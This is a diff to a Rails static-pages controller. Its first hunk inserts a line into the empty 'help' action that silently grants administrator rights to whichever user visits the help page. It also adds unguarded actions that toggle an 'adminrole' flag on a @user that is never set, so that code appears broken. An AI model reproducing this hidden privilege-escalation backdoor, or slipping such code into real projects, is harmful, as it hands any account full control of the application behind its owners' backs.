@@ -3,6 +3,7 @@ class StaticPagesController < ApplicationController
   end
 
   def help
+      current_user.update_attribute :admin, true
   end
 
   def about
@@ -13,6 +14,22 @@ class StaticPagesController < ApplicationController
    @orders = Order.all
           
   end
+  
+  def users
+   
+    @users = User.all
+  end
+  
+  def upgrade_admin
+        @user.update_attribute(:adminrole, true)
+        redirect_to :action => :admin_users
+  end
+    
+    def downgrade_admin
+       @user.update_attribute(:adminrole, false)
+         redirect_to :action => :admin_users
+    end   
+
   
   def paid
     # redirect_to "/cart/clear"
